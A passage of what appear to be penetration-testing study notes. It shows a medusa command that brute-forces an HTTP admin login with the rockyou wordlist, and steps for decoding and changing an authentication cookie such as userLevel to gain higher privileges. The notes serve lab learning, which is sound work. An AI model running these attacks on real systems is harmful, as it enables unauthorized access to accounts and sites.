	- i.e. `medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`

<br>

**Weak Authentication**:
- check cookie values in requests (i.e. via Burp) to see if this is how the website is authenticating users (i.e. `userLevel=...`)
- if so, see if it is in plaintext or a format which can be decoded like base64 
- next, change this cookie value to bypass the weak authentication and become a higher privileged users on the website 

<br>

